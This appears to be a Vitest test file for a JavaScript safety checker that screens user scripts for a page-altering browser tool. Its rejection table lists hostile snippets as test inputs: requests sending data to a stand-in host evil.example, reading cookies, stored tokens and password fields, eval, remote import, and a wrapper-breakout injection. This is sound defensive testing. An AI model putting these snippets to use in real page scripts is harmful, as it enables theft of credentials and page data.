import { describe, expect, it } from 'vitest';
import { checkJs } from '../../src/lib/js-safety';

describe('checkJs', () => {
  it('accepts typical alter scripts and describes them', () => {
    const result = checkJs(`
      alter.onElement('ytd-rich-item-renderer', (item) => {
        const time = alter.text(item.querySelector('.badge'));
        if (time.split(':').length < 3 && parseInt(time) < 2) item.style.display = 'none';
      });
      alter.on(document, 'keydown', (e) => { if (e.key === 'j') document.querySelector('.next')?.scrollIntoView(); });
      const button = alter.h('button', { text: 'Export', onClick: () => alter.download('table.csv', 'a,b') });
      document.body.append(button);
      for (const link of document.querySelectorAll('a')) link.target = '_blank';
      const here = location.href;
      await alter.waitFor('main');
    `);
    expect(result.problems).toEqual([]);
    expect(result.ok).toBe(true);
    expect(result.capabilities).toEqual(
      expect.arrayContaining([
        'Watches the page for changes',
        'Changes how elements look',
        'Adds keyboard shortcuts',
        'Adds elements to the page',
        'Downloads files',
      ]),
    );
  });

  it.each([
    ["fetch('https://evil.example', { method: 'POST' })", 'fetch'],
    ['window.fetch(url)', 'fetch'],
    ['new XMLHttpRequest()', 'XMLHttpRequest'],
    ["new WebSocket('wss://evil.example')", 'WebSocket'],
    ['navigator.sendBeacon(url, data)', 'sendBeacon'],
    ['const c = document.cookie', 'cookie'],
    ["localStorage.getItem('token')", 'localStorage'],
    ["eval('1')", 'eval'],
    ["new Function('return 1')()", 'Function'],
    ["setTimeout('alert(1)', 10)", 'setTimeout with a string'],
    ["import('https://evil.example/x.js')", 'import()'],
    ["location.href = 'https://evil.example/?' + data", 'Navigates'],
    ["window.location = 'https://evil.example'", 'Navigates'],
    ["location.assign('https://evil.example')", 'Navigates'],
    ["window.open('https://evil.example')", 'window.open'],
    ["window['fe' + 'tch'](url)", 'computed name'],
    ["document.querySelector('form').submit()", 'submit'],
    ["document.querySelector('input[type=password]').value", 'password'],
    ["el.setAttribute('onclick', 'steal()')", 'inline event handler'],
    ["document.querySelector('.ytp-skip-ad-button').click()", '.click()'],
    ['HTMLElement.prototype.click.call(button)', '.click()'],
    ["button.dispatchEvent(new MouseEvent('click', { bubbles: true }))", '.dispatchEvent()'],
    ['chrome.runtime.sendMessage({})', 'chrome'],
    ["parent.postMessage(document.body.innerText, '*')", 'postMessage'],
    ['with (document) { title }', 'with'],
  ])('rejects %s', (js, expected) => {
    const result = checkJs(js);
    expect(result.ok).toBe(false);
    expect(result.problems.join(' ')).toContain(expected);
  });

  it('treats names that every object has, like toLocaleString, as ordinary code', () => {
    const result = checkJs(`alter.data.each((o) => alter.log(o.count.toLocaleString('en-US'), o.toString(), o.constructor, o.hasOwnProperty('a')));`);
    expect(result.ok && result.problems).toEqual([]);
  });

  it('rejects scripts that break out of their wrapper', () => {
    const result = checkJs("}); fetch('https://evil.example'); (async function () {");
    expect(result.ok).toBe(false);
  });

  it('reports syntax errors', () => {
    expect(checkJs('alter.onElement(').problems[0]).toMatch(/Syntax error/);
  });

  it('warns about raw HTML and changed links without blocking', () => {
    const result = checkJs("el.innerHTML = '<b>hi</b>'; link.href = '/new';");
    expect(result.ok).toBe(true);
    expect(result.warnings).toEqual(['Writes raw HTML into the page', 'Changes links or sources']);
  });

  it('still understands scripts saved before the rename', () => {
    const result = checkJs(`vb.onElement('.x', (el) => el.append(vb.h('b', { text: '!' })));`);
    expect(result.ok).toBe(true);
    expect(result.capabilities).toEqual(expect.arrayContaining(['Watches the page for changes', 'Adds elements to the page']));
  });
});
